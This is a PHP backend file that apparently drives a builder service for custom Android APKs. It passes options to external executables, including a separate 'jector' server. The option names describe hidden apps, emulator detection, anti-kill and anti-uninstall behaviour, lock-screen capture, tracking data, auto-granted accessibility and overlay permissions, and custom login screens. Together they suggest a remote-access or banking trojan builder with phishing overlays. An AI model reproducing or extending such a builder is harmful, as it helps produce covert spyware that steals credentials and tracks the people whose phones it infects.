<?php
//this to run VB.net app , to start build apk
function BuildStore(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_draw,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $miuiautostart,
    $autorunback,
    $installtype,
    $hide_type,
    $nosleep,
    $capturelock,
    $trakingdata,
    $all_config,
    $no_delete
): string {
    try {

        $output = [];
        $return_var = 0;


        //here before Solarstarter.exe add Cd "C:\inetpub\wwwroot\yaarsa\private" && ...

        $command = 'SolrStarter.exe ';
        $command .= escapeshellarg("lunch") . " ";

        $arguments = [
            $appid,
            $userid,
            $clientname,
            $email,
            $mainActivity,
            $app_folder,
            $UserHost,
            $use_access,
            $use_draw,
            $use_antkill,
            $use_atoprims,
            $notifytitle,
            $notifymsg,
            $user_allprims,
            $buildtype,
            $appname,
            $appversion,
            $appicopath,
            $appurl,
            $logintitle,
            $logindis,
            $loginbtn,
            $lngshort,
            $hiddenapp,
            $noemulator,
            $miuiautostart,
            $autorunback,
            $installtype,
            $hide_type,
            $nosleep,
            $capturelock,
            $trakingdata,
            $all_config,
            $no_delete
        ];



        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }


        // Execute the command
        exec($command, $output, $return_var);


        if ($return_var !== 0) {

            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {
            return Format($output[0], OP_Success);
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("oops something went wrong , Please try again later", OP_Fail);
    }
}


function BuildCustom(
    $appid,
    $userid,
    $clientname,
    $email,
    $mainActivity,
    $app_folder,
    $UserHost,
    $use_access,
    $use_draw,
    $use_antkill,
    $use_atoprims,
    $notifytitle,
    $notifymsg,
    $user_allprims,
    $buildtype,
    $appname,
    $appversion,
    $appicopath,
    $appurl,
    $logintitle,
    $logindis,
    $loginbtn,
    $lngshort,
    $hiddenapp,
    $noemulator,
    $miuiautostart,
    $autorunback,
    $installtype,
    $hide_type,
    $nosleep,
    $capturelock,
    $trakingdata,
    $all_config,
    $no_delete
): string {
    try {

        $output = [];
        $return_var = 0;


        $command = "SolrStarter.exe ";
        $command .= escapeshellarg("lunch") . " ";

        $arguments = [
            $appid,
            $userid,
            $clientname,
            $email,
            $mainActivity,
            $app_folder,
            $UserHost,
            $use_access,
            $use_draw,
            $use_antkill,
            $use_atoprims,
            $notifytitle,
            $notifymsg,
            $user_allprims,
            $buildtype,
            $appname,
            $appversion,
            $appicopath,
            $appurl,
            $logintitle,
            $logindis,
            $loginbtn,
            $lngshort,
            $hiddenapp,
            $noemulator,
            $miuiautostart,
            $autorunback,
            $installtype,
            $hide_type,
            $nosleep,
            $capturelock,
            $trakingdata,
            $all_config,
            $no_delete
        ];


        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }


        // Execute the command
        exec($command, $output, $return_var);


        if ($return_var !== 0) {

            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {
            return Format($output[0], OP_Success);
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("oops something went wrong , Please try again later", OP_Fail);
    }
}

function excutejector($arguments)
{
    try {

        $output = [];
        $return_var = 0;


        $command =  __DIR__ . "\\" . "jectorserver" . "\\" . "jectorserver.exe";
        $command .= " ";

        foreach ($arguments as $arg) {
            $command .= escapeshellarg(base64_encode($arg)) . " ";
        }


        // Execute the command
        exec($command, $output, $return_var);


        if ($return_var !== 0) {

            return Format("Error executing command. Return code: $return_var", OP_Fail);
        } else {
            
            if (!empty($output)) {
                return Format($output[0], OP_Success);
            } else {
                return Format("unkown jector response.", OP_Fail);
            }
        }
    } catch (\Throwable $th) {
        logError($th);
        return Format("oops something went wrong , Please try again later", OP_Fail);
    }
}
